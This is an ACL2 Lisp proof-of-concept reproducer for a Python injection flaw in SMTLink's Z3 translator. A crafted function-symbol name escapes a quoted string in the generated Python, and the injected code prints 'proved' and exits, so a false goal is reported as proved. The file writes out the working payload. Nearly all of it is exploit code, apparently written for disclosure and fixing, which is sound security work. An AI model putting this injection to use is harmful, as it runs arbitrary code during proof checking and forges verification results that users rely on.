;; Reproducer for SMTLink uninterpreted-function Python injection + stdout "proved" spoof
;; Sources:
;;   books/projects/smtlink/trusted/z3-py/translator.lisp:1049-1051 (raw ,name inside '...')
;;   books/projects/smtlink/trusted/run.lisp:48 ((equal (car lines) "proved"))
(in-package "ACL2")
(set-state-ok t)

(defun smt-translate-uninterpreted-decl-line (name)
  ;; Mirrors translator.lisp:1049-1051:
  ;; `(,(translate-symbol name) "= _SMT_.Function(" #\' ,name #\' #\, #\Space ...)
  (concatenate 'string
               "f = _SMT_.Function('"
               (symbol-name name)
               "', _SMT_.IntSort(), _SMT_.BoolSort())"))

(defun smt-interpret-lines (lines)
  ;; Mirrors trusted/run.lisp:48: ((if (equal (car lines) "proved")) (mv t state))
  (cond ((atom lines) nil)
        ((equal (car lines) "proved") t)
        (t nil)))

(defconst *evil-fn-sym* '|bad', _SMT_.IntSort(), _SMT_.BoolSort());print('proved');import sys;sys.exit(0)#|)

(defun write-injected-py (state)
  (declare (xargs :stobjs state :mode :program))
  (let ((line (smt-translate-uninterpreted-decl-line *evil-fn-sym*)))
    (mv-let (chan state)
      (open-output-channel "injected.py" :character state)
      (let ((state (princ$ "import sys
sys.path.insert(0, \"/Users/ember/dev/acl2-fix/head-worktree/books/projects/smtlink/z3_interface\")
from ACL2_to_Z3 import ACL22SMT
_SMT_ = ACL22SMT()
" chan state)))
        (let ((state (princ$ line chan state)))
          (let ((state (princ$ "
_SMT_.prove(False)
" chan state)))
            (let ((state (close-output-channel chan state)))
              (mv nil '(value-triple :wrote-injected-py) state))))))))

(write-injected-py state)
